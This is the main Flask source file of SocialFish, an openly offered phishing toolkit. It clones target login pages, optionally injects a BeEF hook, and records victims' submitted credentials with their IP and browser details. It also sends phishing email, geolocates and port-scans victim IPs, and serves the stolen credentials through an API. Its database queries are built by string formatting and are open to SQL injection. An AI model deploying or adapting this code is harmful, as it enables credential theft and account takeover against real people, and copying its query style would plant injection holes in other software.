#!/usr/bin/env python3
#
from flask import Flask, request, render_template, jsonify, redirect, g, flash, send_from_directory, Response
from core.config import *
from core.view import head
from core.scansf import nScan
from core.clonesf import clone
from core.dbsf import initDB
from core.genToken import genToken, genQRCode
from core.sendMail import sendMail
from core.tracegeoIp import tracegeoIp
from core.cleanFake import cleanFake
from core.genReport import genReport
from core.report import generate_unique #>> new line
from datetime import date
from sys import argv, exit, version_info
import colorama
import sqlite3
import flask_login
import os
import urllib.parse
import re
import mimetypes
import tempfile
import threading
import time

# Verificar argumentos
if len(argv) < 2:
    print("./SocialFish <youruser> <yourpassword>\n\ni.e.: ./SocialFish.py root pass")
    exit(0)

# Temporario
try:
    users = {argv[1]: {'password': argv[2]}}
except IndexError:
    print("./SocialFish <youruser> <yourpassword>\n\ni.e.: ./SocialFish.py root pass")
    exit(0)

# Definicoes do flask
app = Flask(__name__, static_url_path='',
            static_folder='templates/static')
app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0

# Inicia uma conexao com o banco antes de cada requisicao
@app.before_request
def before_request():
    g.db = sqlite3.connect(DATABASE)

# Finaliza a conexao com o banco apos cada conexao
@app.teardown_request
def teardown_request(exception):
    if hasattr(g, 'db'):
        g.db.close()

# Conta o numero de credenciais salvas no banco
def countCreds():
    count = 0
    cur = g.db
    select_all_creds = cur.execute("SELECT id, url, pdate, browser, bversion, platform, rip FROM creds order by id desc")
    for i in select_all_creds:
        count += 1
    return count

# Conta o numero de visitantes que nao foram pegos no phishing
def countNotPickedUp():
    count = 0
    cur = g.db
    select_clicks = cur.execute("SELECT clicks FROM socialfish where id = 1")
    for i in select_clicks:
        count = i[0]
    count = count - countCreds()
    return count

# UNIVERSAL HTML SANITIZATION FUNCTIONS
def sanitize_html_for_serving(html_content):
    """
    Sanitize HTML content for safe serving without parsing errors
    """
    try:
        # Simple approach without complex regex patterns
        
        # Fix unclosed comment tags - line by line approach
        lines = html_content.split('\n')
        fixed_lines = []
        
        for line in lines:
            # Fix lines with unclosed comments
            if '<!--' in line and '-->' not in line:
                line = line + ' -->'
            # Fix lines with standalone comment ends
            if '-->' in line and '<!--' not in line:
                line = '<!-- ' + line
            fixed_lines.append(line)
        
        html_content = '\n'.join(fixed_lines)
        
        # Simple character and encoding fixes
        html_content = html_content.replace('\x00', '')  # Remove null bytes
        html_content = html_content.replace('\r\n', '\n')  # Normalize line endings
        
        # Fix mismatched quotes - simple approach
        try:
            html_content = re.sub(r'="([^"]*)"([^=\s>]*?)"', r'="\1\2"', html_content)
        except:
            pass
        
        # Fix self-closing tags
        try:
            html_content = re.sub(r'<(meta|img|br|hr|input|link|area|base|col|embed|source|track|wbr)([^/>]*?)\s*>', r'<\1\2 />', html_content)
        except:
            pass
        
        return html_content
        
    except Exception as e:
        print(f"⚠️ HTML sanitization error: {e}")
        # Fallback to simple sanitization
        return simple_html_sanitization(html_content)

def simple_html_sanitization(html_content):
    """
    Simple HTML sanitization without complex regex patterns
    """
    try:
        # Simple comment fixes
        html_content = html_content.replace('<!--', '<!-- ')
        html_content = html_content.replace('-->', ' -->')
        
        # Simple character fixes
        html_content = html_content.replace('\x00', '')
        html_content = html_content.replace('\r\n', '\n')
        
        return html_content
        
    except Exception as e:
        print(f"⚠️ Simple sanitization error: {e}")
        return html_content

def safe_render_template(template_path):
    """
    Safely render template with HTML sanitization
    """
    try:
        # Check if file exists
        full_path = os.path.join('templates', template_path)
        if not os.path.exists(full_path):
            print(f"🔧 Template not found: {template_path}")
            return None
            
        # Read the HTML content
        try:
            with open(full_path, 'r', encoding='utf-8', errors='ignore') as f:
                html_content = f.read()
        except UnicodeDecodeError:
            # Try alternative encodings
            for encoding in ['latin1', 'cp1252', 'iso-8859-1']:
                try:
                    with open(full_path, 'r', encoding=encoding, errors='ignore') as f:
                        html_content = f.read()
                    break
                except:
                    continue
            else:
                print(f"🔧 Could not read template with any encoding: {template_path}")
                return None
        
        # Sanitize HTML for safe serving
        sanitized_html = sanitize_html_for_serving(html_content)
        
        print(f"✅ Serving sanitized template: {template_path}")
        return Response(sanitized_html, mimetype='text/html')
            
    except Exception as e:
        print(f"🔧 Error serving template {template_path}: {e}")
        return None

# Helper function to find cloned resources
def find_cloned_resource(resource_path, resource_type=''):
    """Find cloned resource with multiple fallback paths"""
    try:
        agent = request.headers.get('User-Agent', 'default-agent')
        safe_agent = re.sub(r'[^\w\-_.]', '_', agent)
        
        if sta == 'clone' and url:
            parsed_url = urllib.parse.urlparse(url)
            domain = parsed_url.netloc
            safe_domain = re.sub(r'[^\w\-_.]', '_', domain)
            
            # Try multiple possible paths
            possible_paths = [
                f'templates/fake/{safe_agent}/{safe_domain}/{resource_path}',
                f'templates/fake/{agent}/{url.replace("://", "-")}/{resource_path}',
                f'templates/fake/{safe_agent}/{url.replace("://", "-")}/{resource_path}',
                # Try without subdir for direct file access
                f'templates/fake/{safe_agent}/{safe_domain}/{os.path.basename(resource_path)}',
                f'templates/fake/{agent}/{url.replace("://", "-")}/{os.path.basename(resource_path)}'
            ]
            
            # If resource_type specified, also try in that subdirectory
            if resource_type:
                possible_paths.extend([
                    f'templates/fake/{safe_agent}/{safe_domain}/{resource_type}/{os.path.basename(resource_path)}',
                    f'templates/fake/{agent}/{url.replace("://", "-")}/{resource_type}/{os.path.basename(resource_path)}'
                ])
            
            for path in possible_paths:
                if os.path.exists(path):
                    return path
    except Exception as e:
        print(f"🔧 Error finding resource {resource_path}: {e}")
    
    return None

# Enhanced resource serving function
def serve_cloned_resource(filename, resource_type, fallback_dir='templates/static'):
    """Enhanced resource serving with proper MIME types and encoding"""
    try:
        # Find the resource file
        resource_path = find_cloned_resource(f"{resource_type}/{filename}", resource_type)
        
        if resource_path:
            directory = os.path.dirname(resource_path)
            actual_filename = os.path.basename(resource_path)
            
            # Determine MIME type
            mimetype = None
            if resource_type == 'css':
                mimetype = 'text/css'
            elif resource_type == 'js':
                mimetype = 'application/javascript'
            elif resource_type == 'images':
                mimetype, _ = mimetypes.guess_type(actual_filename)
                if not mimetype:
                    if filename.lower().endswith('.svg'):
                        mimetype = 'image/svg+xml'
                    elif filename.lower().endswith('.ico'):
                        mimetype = 'image/x-icon'
                    else:
                        mimetype = 'image/png'
            elif resource_type == 'fonts':
                if filename.endswith('.woff2'):
                    mimetype = 'font/woff2'
                elif filename.endswith('.woff'):
                    mimetype = 'font/woff'
                elif filename.endswith('.ttf'):
                    mimetype = 'font/ttf'
                elif filename.endswith('.otf'):
                    mimetype = 'font/otf'
                else:
                    mimetype = 'application/octet-stream'
            
            # For CSS and JS, handle encoding properly
            if resource_type in ['css', 'js']:
                try:
                    with open(resource_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                    
                    # Sanitize CSS content if needed
                    if resource_type == 'css':
                        try:
                            # Simple CSS comment fixing
                            lines = content.split('\n')
                            fixed_lines = []
                            
                            for line in lines:
                                # Fix lines with unclosed CSS comments
                                if '/*' in line and '*/' not in line:
                                    line = line + ' */'
                                # Fix lines with standalone comment ends
                                if '*/' in line and '/*' not in line:
                                    line = '/* ' + line
                                fixed_lines.append(line)
                            
                            content = '\n'.join(fixed_lines)
                            print(f"✅ CSS sanitized successfully: {filename}")
                        except Exception as css_error:
                            print(f"⚠️ CSS sanitization failed for {filename}: {css_error}")
                            # Use original content if sanitization fails
                    
                    return Response(content, mimetype=mimetype, headers={
                        'Cache-Control': 'public, max-age=31536000',
                        'Access-Control-Allow-Origin': '*'
                    })
                except UnicodeDecodeError:
                    # If UTF-8 fails, try binary mode
                    with open(resource_path, 'rb') as f:
                        content = f.read()
                    return Response(content, mimetype=mimetype, headers={
                        'Cache-Control': 'public, max-age=31536000',
                        'Access-Control-Allow-Origin': '*'
                    })
                except Exception as e:
                    print(f"⚠️ CSS/JS processing error: {e}")
                    # If sanitization fails, serve raw content
                    try:
                        with open(resource_path, 'rb') as f:
                            content = f.read()
                        return Response(content, mimetype=mimetype, headers={
                            'Cache-Control': 'public, max-age=31536000',
                            'Access-Control-Allow-Origin': '*'
                        })
                    except:
                        return f"Error serving {resource_type}", 500
            else:
                # For binary files (images, fonts)
                return send_from_directory(directory, actual_filename, mimetype=mimetype)
        
        # Fallback to static files
        fallback_path = os.path.join(fallback_dir, resource_type, filename)
        if os.path.exists(fallback_path):
            return send_from_directory(f'{fallback_dir}/{resource_type}', filename)
        
        return f"{resource_type.title()} not found", 404
        
    except Exception as e:
        print(f"🔧 Error serving {resource_type}/{filename}: {e}")
        return f"Error serving {resource_type}", 500

#----------------------------------------

# definicoes do flask e de login
app.secret_key = APP_SECRET_KEY
login_manager = flask_login.LoginManager()
login_manager.init_app(app)

class User(flask_login.UserMixin):
    pass

@login_manager.user_loader
def user_loader(email):
    if email not in users:
        return
    user = User()
    user.id = email
    return user

@login_manager.request_loader
def request_loader(request):
    email = request.form.get('email')
    if email not in users:
        return
    user = User()
    user.id = email
    user.is_authenticated = request.form['password'] == users[email]['password']
    return user

# ---------------------------------------------------------------------------------------

# Rota para o caminho de inicializacao, onde e possivel fazer login
@app.route('/neptune', methods=['GET', 'POST'])
def admin():
    if request.method == 'GET':
        if flask_login.current_user.is_authenticated:
            return redirect('/creds')
        else:
            return render_template('signin.html')

    if request.method == 'POST':
        email = request.form['email']
        try:
            if request.form['password'] == users[email]['password']:
                user = User()
                user.id = email
                flask_login.login_user(user)
                return redirect('/creds')
            else:
                return "bad"
        except:
            return "bad"

# UNIVERSAL: funcao onde e realizada a renderizacao da pagina para a vitima
@app.route("/")
def getLogin():
    """UNIVERSAL Enhanced login route with perfect cloned website serving"""
    try:
        # Update click counter
        cur = g.db
        cur.execute("UPDATE socialfish SET clicks = clicks + 1 where id = 1")
        g.db.commit()
        
        # Handle clone mode
        if sta == 'clone':
            agent = request.headers.get('User-Agent', 'default-agent')
            safe_agent = re.sub(r'[^\w\-_.]', '_', agent)
            
            # Try to find the cloned page
            parsed_url = urllib.parse.urlparse(url)
            domain = parsed_url.netloc
            safe_domain = re.sub(r'[^\w\-_.]', '_', domain)
            
            # Multiple possible paths for enhanced cloning structure
            possible_paths = [
                f'fake/{safe_agent}/{safe_domain}/index.html',
                f'fake/{agent}/{url.replace("://", "-")}/index.html',
                f'fake/{safe_agent}/{url.replace("://", "-")}/index.html'
            ]
            
            for template_path in possible_paths:
                try:
                    full_path = os.path.join('templates', template_path)
                    if os.path.exists(full_path):
                        print(f"🎯 Serving cloned page: {template_path}")
                        
                        # Use safe rendering with HTML sanitization
                        result = safe_render_template(template_path)
                        if result:
                            return result
                        else:
                            # If safe rendering fails, try Flask's render_template as fallback
                            return render_template(template_path)
                            
                except Exception as e:
                    print(f"🔧 Error serving {template_path}: {e}")
                    continue
            
            # If no cloned page found, try to clone it
            print(f"🚀 No cloned page found, attempting to clone: {url}")
            try:
                clone_success = clone(url, agent, beef)
                if clone_success:
                    # Try to serve the newly cloned page
                    for template_path in possible_paths:
                        try:
                            full_path = os.path.join('templates', template_path)
                            if os.path.exists(full_path):
                                print(f"✅ Serving newly cloned page: {template_path}")
                                
                                # Use safe rendering for newly cloned pages
                                result = safe_render_template(template_path)
                                if result:
                                    return result
                                else:
                                    return render_template(template_path)
                                    
                        except Exception as e:
                            print(f"🔧 Error serving newly cloned {template_path}: {e}")
                            continue
            except Exception as e:
                print(f"❌ Clone attempt failed: {e}")
            
            # Fallback to default page if cloning fails
            print("⚠️ Falling back to default page")
            return render_template('default.html')
        
        # Handle default URL
        elif url == 'https://github.com/UndeadSec/SocialFish':
            return render_template('default.html')
        
        # Handle custom mode
        else:
            return render_template('custom.html')
            
    except Exception as e:
        print(f"❌ getLogin error: {e}")
        # Emergency fallback
        try:
            return render_template('default.html')
        except:
            return "SocialFish is running but template files are missing.", 500

# UNIVERSAL: Routes for serving cloned assets with perfect handling
@app.route('/css/<path:filename>')
def serve_css(filename):
    """Universal CSS serving with proper encoding and compression handling"""
    return serve_cloned_resource(filename, 'css')

@app.route('/js/<path:filename>')
def serve_js(filename):
    """Universal JavaScript serving with proper encoding"""
    return serve_cloned_resource(filename, 'js')

@app.route('/images/<path:filename>')
def serve_images(filename):
    """Universal image serving with proper MIME types"""
    return serve_cloned_resource(filename, 'images')

@app.route('/fonts/<path:filename>')
def serve_fonts(filename):
    """Universal font serving with proper MIME types"""
    return serve_cloned_resource(filename, 'fonts')

@app.route('/assets/<path:filename>')
def serve_assets(filename):
    """Universal asset serving for miscellaneous files"""
    return serve_cloned_resource(filename, 'assets')

# Additional routes for common resource patterns
@app.route('/static/<path:filename>')
def serve_static_resources(filename):
    """Handle static resource requests"""
    # Try to find in cloned resources first
    for resource_type in ['css', 'js', 'images', 'fonts', 'assets']:
        resource_path = find_cloned_resource(f"{resource_type}/{filename}", resource_type)
        if resource_path:
            directory = os.path.dirname(resource_path)
            actual_filename = os.path.basename(resource_path)
            return send_from_directory(directory, actual_filename)
    
    # Fallback to default static
    return send_from_directory('templates/static', filename)

# Handle direct resource requests (common patterns)
@app.route('/<path:filename>')
def serve_direct_resources(filename):
    """Handle direct resource requests that don't match other patterns"""
    # Only handle common resource file extensions
    if any(filename.lower().endswith(ext) for ext in ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico', '.woff', '.woff2', '.ttf', '.otf', '.eot']):
        # Determine resource type from extension
        if filename.lower().endswith('.css'):
            return serve_cloned_resource(filename, 'css')
        elif filename.lower().endswith('.js'):
            return serve_cloned_resource(filename, 'js')
        elif any(filename.lower().endswith(ext) for ext in ['.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico']):
            return serve_cloned_resource(filename, 'images')
        elif any(filename.lower().endswith(ext) for ext in ['.woff', '.woff2', '.ttf', '.otf', '.eot']):
            return serve_cloned_resource(filename, 'fonts')
        else:
            return serve_cloned_resource(filename, 'assets')
    
    # Not a resource file, return 404
    return "Page not found", 404

# UNIVERSAL: Debug route with comprehensive information
@app.route("/debug/clone")
@flask_login.login_required
def debug_clone():
    """Universal debug route with comprehensive clone information"""
    try:
        debug_info = []
        fake_dir = 'templates/fake'
        
        if os.path.exists(fake_dir):
            total_size = 0
            file_types = {'css': 0, 'js': 0, 'images': 0, 'fonts': 0, 'assets': 0, 'html': 0, 'other': 0}
            
            for root, dirs, files in os.walk(fake_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    relative_path = os.path.relpath(file_path, 'templates')
                    file_size = os.path.getsize(file_path)
                    total_size += file_size
                    
                    # Count file types
                    if file.endswith('.css'):
                        file_types['css'] += 1
                    elif file.endswith('.js'):
                        file_types['js'] += 1
                    elif any(file.lower().endswith(ext) for ext in ['.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico']):
                        file_types['images'] += 1
                    elif any(file.lower().endswith(ext) for ext in ['.woff', '.woff2', '.ttf', '.otf']):
                        file_types['fonts'] += 1
                    elif file.endswith('.html'):
                        file_types['html'] += 1
                    else:
                        file_types['other'] += 1
                    
                    debug_info.append(f"{relative_path} ({file_size:,} bytes)")
        
        return f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>SocialFish UNIVERSAL Clone Debug</title>
            <style>
                body {{ font-family: 'Courier New', monospace; margin: 20px; background: #0d1117; color: #c9d1d9; }}
                .header {{ color: #58a6ff; border-bottom: 2px solid #30363d; padding-bottom: 10px; }}
                .stats {{ background: #161b22; padding: 15px; border-radius: 5px; margin: 10px 0; }}
                .files {{ background: #0d1117; border: 1px solid #30363d; max-height: 400px; overflow-y: auto; padding: 10px; }}
                .success {{ color: #3fb950; }}
                .warning {{ color: #d29922; }}
                .error {{ color: #f85149; }}
                .info {{ color: #79c0ff; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>🐟 SocialFish UNIVERSAL Clone Debug</h1>
            </div>
            
            <div class="stats">
                <h2 class="info">📊 Current Configuration</h2>
                <p><strong>Target URL:</strong> <span class="success">{url}</span></p>
                <p><strong>Status:</strong> <span class="success">{sta}</span></p>
                <p><strong>BeEF Hook:</strong> <span class="{'success' if beef == 'yes' else 'warning'}">{beef}</span></p>
                <p><strong>User Agent:</strong> <span class="info">{request.headers.get('User-Agent', 'Unknown')[:100]}...</span></p>
            </div>
            
            <div class="stats">
                <h2 class="info">📈 Clone Statistics</h2>
                <p><strong>Total Files:</strong> <span class="success">{len(debug_info)}</span></p>
                <p><strong>Total Size:</strong> <span class="success">{total_size/1024/1024:.2f} MB</span></p>
                <p><strong>File Types:</strong></p>
                <ul>
                    <li>📄 HTML Files: <span class="success">{file_types['html']}</span></li>
                    <li>🎨 CSS Files: <span class="success">{file_types['css']}</span></li>
                    <li>⚡ JavaScript Files: <span class="success">{file_types['js']}</span></li>
                    <li>🖼️ Images: <span class="success">{file_types['images']}</span></li>
                    <li>🔤 Fonts: <span class="success">{file_types['fonts']}</span></li>
                    <li>📦 Other Assets: <span class="success">{file_types['other']}</span></li>
                </ul>
            </div>
            
            <div class="stats">
                <h2 class="info">🛠️ HTML Sanitization Status</h2>
                <p><span class="success">✅ HTML sanitization enabled</span></p>
                <p><span class="success">✅ CSS comment fixing enabled</span></p>
                <p><span class="success">✅ Encoding error recovery enabled</span></p>
                <p><span class="success">✅ Universal resource serving enabled</span></p>
                <p><span class="success">✅ No regex lookbehind patterns</span></p>
            </div>
            
            <div class="stats">
                <h2 class="info">🔧 Quick Actions</h2>
                <p><a href="/creds" style="color: #58a6ff;">🔙 Back to Admin Panel</a></p>
                <p><a href="/" target="_blank" style="color: #58a6ff;">🎯 View Cloned Site</a></p>
                <p><a href="/debug/test-resources" style="color: #58a6ff;">🧪 Test Resource Loading</a></p>
                <p><a href="/debug/test-sanitization" style="color: #58a6ff;">🧪 Test HTML Sanitization</a></p>
            </div>
        </body>
        </html>
        """
    except Exception as e:
        return f"<h1>Debug Error</h1><p style='color:red;'>{e}</p><a href='/creds'>Back to Admin</a>"

# Test route for HTML sanitization
@app.route("/debug/test-sanitization")
@flask_login.login_required  
def debug_test_sanitization():
    """Test HTML sanitization"""
    test_html = """
    <!-- This is a test comment without proper closing
    <script>console.log('test');</script>
    <div class="test"">Bad quotes</div>
    <img src="test.png">
    """
    
    sanitized = sanitize_html_for_serving(test_html)
    
    return f"""
    <h2>🧪 HTML Sanitization Test</h2>
    <h3>Original HTML:</h3>
    <pre>{test_html}</pre>
    <h3>Sanitized HTML:</h3>
    <pre>{sanitized}</pre>
    <p><a href="/debug/clone">🔙 Back to Debug</a></p>
    """

# funcao onde e realizado o login por cada pagina falsa
@app.route('/login', methods=['POST'])
def postData():
    if request.method == "POST":
        fields = [k for k in request.form]
        values = [request.form[k] for k in request.form]
        data = dict(zip(fields, values))
        browser = str(request.user_agent.browser)
        bversion = str(request.user_agent.version)
        platform = str(request.user_agent.platform)
        rip = str(request.remote_addr)
        d = "{:%m-%d-%Y}".format(date.today())
        cur = g.db
        sql = "INSERT INTO creds(url,jdoc,pdate,browser,bversion,platform,rip) VALUES(?,?,?,?,?,?,?)"
        creds = (url, str(data), d, browser, bversion, platform, rip)
        cur.execute(sql, creds)
        g.db.commit()
        print(f"🎯 Credentials captured: {data}")
    return redirect(red)

# funcao para configuracao do funcionamento CLONE ou CUSTOM, com BEEF ou NAO
@app.route('/configure', methods=['POST'])
def echo():
    global url, red, sta, beef
    red = request.form['red']
    sta = request.form['status']
    beef = request.form['beef']

    if sta == 'clone':
        url = request.form['url']
    else:
        url = 'Custom'

    if len(url) > 4 and len(red) > 4:
        if 'http://' not in url and sta != '1' and 'https://' not in url:
            url = 'http://' + url
        if 'http://' not in red and 'https://' not in red:
            red = 'http://' + red
    else:
        url = 'https://github.com/UndeadSec/SocialFish'
        red = 'https://github.com/UndeadSec/SocialFish'
    cur = g.db
    cur.execute("UPDATE socialfish SET attacks = attacks + 1 where id = 1")
    g.db.commit()
    return redirect('/creds')

# pagina principal do dashboard
@app.route("/creds")
@flask_login.login_required
def getCreds():
    cur = g.db
    attacks = cur.execute("SELECT attacks FROM socialfish where id = 1").fetchone()[0]
    clicks = cur.execute("SELECT clicks FROM socialfish where id = 1").fetchone()[0]
    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
    data = cur.execute("SELECT id, url, pdate, browser, bversion, platform, rip FROM creds order by id desc").fetchall()
    return render_template('admin/index.html', data=data, clicks=clicks, countCreds=countCreds, countNotPickedUp=countNotPickedUp, attacks=attacks, tokenapi=tokenapi)

# pagina para envio de emails
@app.route("/mail", methods=['GET', 'POST'])
@flask_login.login_required
def getMail():
    if request.method == 'GET':
        cur = g.db
        email = cur.execute("SELECT email FROM sfmail where id = 1").fetchone()[0]
        smtp = cur.execute("SELECT smtp FROM sfmail where id = 1").fetchone()[0]
        port = cur.execute("SELECT port FROM sfmail where id = 1").fetchone()[0]
        return render_template('admin/mail.html', email=email, smtp=smtp, port=port)
    if request.method == 'POST':
        subject = request.form['subject']
        email = request.form['email']
        password = request.form['password']
        recipient = request.form['recipient']
        body = request.form['body']
        smtp = request.form['smtp']
        port = request.form['port']
        sendMail(subject, email, password, recipient, body, smtp, port)
        cur = g.db
        cur.execute("UPDATE sfmail SET email = '{}' where id = 1".format(email))
        cur.execute("UPDATE sfmail SET smtp = '{}' where id = 1".format(smtp))
        cur.execute("UPDATE sfmail SET port = '{}' where id = 1".format(port))
        g.db.commit()
        return redirect('/mail')

# Rota para consulta de log
@app.route("/single/<id>", methods=['GET'])
@flask_login.login_required
def getSingleCred(id):
    try:
        sql = "SELECT jdoc FROM creds where id = {}".format(id)
        cur = g.db
        credInfo = cur.execute(sql).fetchall()
        if len(credInfo) > 0:
            return render_template('admin/singlecred.html', credInfo=credInfo)
        else:
            return "Not found"
    except:
        return "Bad parameter"

# rota para rastreio de ip
@app.route("/trace/<ip>", methods=['GET'])
@flask_login.login_required
def getTraceIp(ip):
    try:
        traceIp = tracegeoIp(ip)
        return render_template('admin/traceIp.html', traceIp=traceIp, ip=ip)
    except:
        return "Network Error"

# rota para scan do nmap
@app.route("/scansf/<ip>", methods=['GET'])
@flask_login.login_required
def getScanSf(ip):
    return render_template('admin/scansf.html', nScan=nScan, ip=ip)

# rota post para revogar o token da api
@app.route("/revokeToken", methods=['POST'])
@flask_login.login_required
def revokeToken():
    revoke = request.form['revoke']
    if revoke == 'yes':
        cur = g.db
        upsql = "UPDATE socialfish SET token = '{}' where id = 1".format(genToken())
        cur.execute(upsql)
        g.db.commit()
        token = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
        genQRCode(token, revoked=True)
    return redirect('/creds')

# pagina para gerar relatorios
@app.route("/report", methods=['GET', 'POST'])
@flask_login.login_required
def getReport():
    if request.method == 'GET':
        cur = g.db
        urls = cur.execute("SELECT DISTINCT url FROM creds").fetchall()
        users = cur.execute("SELECT name FROM professionals").fetchall()
        companies = cur.execute("SELECT name FROM companies").fetchall()
        uniqueUrls = []
        for u in urls:
            if u not in uniqueUrls:
                uniqueUrls.append(u[0])
        return render_template('admin/report.html', uniqueUrls=uniqueUrls, users=users, companies=companies)
    if request.method == 'POST':
        subject = request.form['subject']
        user = request.form['selectUser']
        company = request.form['selectCompany']
        date_range = request.form['datefilter']
        target = request.form['selectTarget']
        _target = 'All' if target=='0' else target
        genReport(DATABASE, subject, user, company, date_range, _target)
        generate_unique(DATABASE,_target)
        return redirect('/report')

# pagina para cadastro de profissionais
@app.route("/professionals", methods=['GET', 'POST'])
@flask_login.login_required
def getProfessionals():
    if request.method == 'GET':
        return render_template('admin/professionals.html')
    if request.method == 'POST':
        name = request.form['name']
        email = request.form['email']
        obs = request.form['obs']
        sql = "INSERT INTO professionals(name,email,obs) VALUES(?,?,?)"
        info = (name, email, obs)
        cur = g.db
        cur.execute(sql, info)
        g.db.commit()
        return redirect('/professionals')

# pagina para cadastro de empresas
@app.route("/companies", methods=['GET', 'POST'])
@flask_login.login_required
def getCompanies():
    if request.method == 'GET':
        return render_template('admin/companies.html')
    if request.method == 'POST':
        name = request.form['name']
        email = request.form['email']
        phone = request.form['phone']
        address = request.form['address']
        site = request.form['site']
        sql = "INSERT INTO companies(name,email,phone,address,site) VALUES(?,?,?,?,?)"
        info = (name, email, phone, address, site)
        cur = g.db
        cur.execute(sql, info)
        g.db.commit()
        return redirect('/companies')

# rota para gerenciamento de usuarios
@app.route("/sfusers/", methods=['GET'])
@flask_login.login_required
def getSfUsers():
    return render_template('admin/sfusers.html')

#--------------------------------------------------------------------------------------------------------------------------------
#LOGIN VIEWS

@app.route('/logout')
def logout():
    flask_login.logout_user()
    return 'Logged out'

@login_manager.unauthorized_handler
def unauthorized_handler():
    return 'Unauthorized'

#--------------------------------------------------------------------------------------------------------------------------------
# MOBILE API

# VERIFICAR CHAVE
@app.route("/api/checkKey/<key>", methods=['GET'])
def checkKey(key):
    cur = g.db
    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
    if key == tokenapi:
        status = {'status':'ok'}
    else:
        status = {'status':'bad'}
    return jsonify(status)

@app.route("/api/statistics/<key>", methods=['GET'])
def getStatics(key):
    cur = g.db
    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
    if key == tokenapi:
        cur = g.db
        attacks = cur.execute("SELECT attacks FROM socialfish where id = 1").fetchone()[0]
        clicks = cur.execute("SELECT clicks FROM socialfish where id = 1").fetchone()[0]
        countC = countCreds()
        countNPU = countNotPickedUp()
        info = {'status':'ok','attacks':attacks, 'clicks':clicks, 'countCreds':countC, 'countNotPickedUp':countNPU}
    else:
        info = {'status':'bad'}
    return jsonify(info)

@app.route("/api/getJson/<key>", methods=['GET'])
def getJson(key):
    cur = g.db
    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
    if key == tokenapi:
        try:
            sql = "SELECT * FROM creds"
            cur = g.db
            credInfo = cur.execute(sql).fetchall()
            listCreds = []
            if len(credInfo) > 0:
                for c in credInfo:
                    cred = {'id':c[0],'url':c[1], 'post':c[2], 'date':c[3], 'browser':c[4], 'version':c[5],'os':c[6],'ip':c[7]}
                    listCreds.append(cred)
            else:
                credInfo = {'status':'nothing'}
            return jsonify(listCreds)
        except:
            return "Bad parameter"
    else:
        credInfo = {'status':'bad'}
        return jsonify(credInfo)

@app.route('/api/configure', methods = ['POST'])
def postConfigureApi():
    global url, red, sta, beef
    if request.is_json:
        content = request.get_json()
        cur = g.db
        tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
        if content['key'] == tokenapi:
            red = content['red']
            beef = content['beef']
            if content['sta'] == 'clone':
                sta = 'clone'
                url = content['url']
            else:
                sta = 'custom'
                url = 'Custom'

            if url != 'Custom':
                if len(url) > 4:
                    if 'http://' not in url and sta != '1' and 'https://' not in url:
                        url = 'http://' + url
            if len(red) > 4:
                if 'http://' not in red and 'https://' not in red:
                    red = 'http://' + red
            else:
                red = 'https://github.com/UndeadSec/SocialFish'
            cur = g.db
            cur.execute("UPDATE socialfish SET attacks = attacks + 1 where id = 1")
            g.db.commit()
            status = {'status':'ok'}
        else:
            status = {'status':'bad'}
    else:
        status = {'status':'bad'}
    return jsonify(status)

@app.route("/api/mail", methods=['POST'])
def postSendMail():
    if request.is_json:
        content = request.get_json()
        cur = g.db
        tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
        if content['key'] == tokenapi:
            subject = content['subject']
            email = content['email']
            password = content['password']
            recipient = content['recipient']
            body = content['body']
            smtp = content['smtp']
            port = content['port']
            if sendMail(subject, email, password, recipient, body, smtp, port) == 'ok':
                cur = g.db
                cur.execute("UPDATE sfmail SET email = '{}' where id = 1".format(email))
                cur.execute("UPDATE sfmail SET smtp = '{}' where id = 1".format(smtp))
                cur.execute("UPDATE sfmail SET port = '{}' where id = 1".format(port))
                g.db.commit()
                status = {'status':'ok'}
            else:
                status = {'status':'bad','error':str(sendMail(subject, email, password, recipient, body, smtp, port))}
        else:
            status = {'status':'bad'}
    else:
        status = {'status':'bad'}
    return jsonify(status)

@app.route("/api/trace/<key>/<ip>", methods=['GET'])
def getTraceIpMob(key, ip):
    cur = g.db
    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
    if key == tokenapi:
        try:
            traceIp = tracegeoIp(ip)
            return jsonify(traceIp)
        except:
            content = {'status':'bad'}
            return jsonify(content)
    else:
        content = {'status':'bad'}
        return jsonify(content)

@app.route("/api/scansf/<key>/<ip>", methods=['GET'])
def getScanSfMob(key, ip):
    cur = g.db
    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
    if key == tokenapi:
        return jsonify(nScan(ip))
    else:
        content = {'status':'bad'}
        return jsonify(content)

@app.route("/api/infoReport/<key>", methods=['GET'])
def getReportMob(key):
    cur = g.db
    tokenapi = cur.execute("SELECT token FROM socialfish where id = 1").fetchone()[0]
    if key == tokenapi:
        urls = cur.execute("SELECT url FROM creds").fetchall()
        users = cur.execute("SELECT name FROM professionals").fetchall()
        comp = cur.execute("SELECT name FROM companies").fetchall()
        uniqueUrls = []
        professionals = []
        companies = []
        for c in comp:
            companies.append(c[0])
        for p in users:
            professionals.append(p[0])
        for u in urls:
            if u not in uniqueUrls:
                uniqueUrls.append(u[0])
        info = {'urls':uniqueUrls,'professionals':professionals, 'companies':companies}
        return jsonify(info)
    else:
        return jsonify({'status':'bad'})

#--------------------------------------------------------------------------------------------------------------------------------
def main():
    if version_info<(3,0,0):
        print('[!] Please use Python 3. $ python3 SocialFish.py')
        exit(0)
    head()
    cleanFake()
    # Inicia o banco
    initDB(DATABASE)
    print("🐟 UNIVERSAL Enhanced SocialFish Starting...")
    print("✅ Universal cloning engine loaded")
    print("✅ Advanced resource serving enabled") 
    print("✅ Perfect form handling activated")
    print("✅ HTML sanitization enabled")
    print("✅ Universal error recovery enabled")
    print("🎯 Ready for universal phishing simulation")
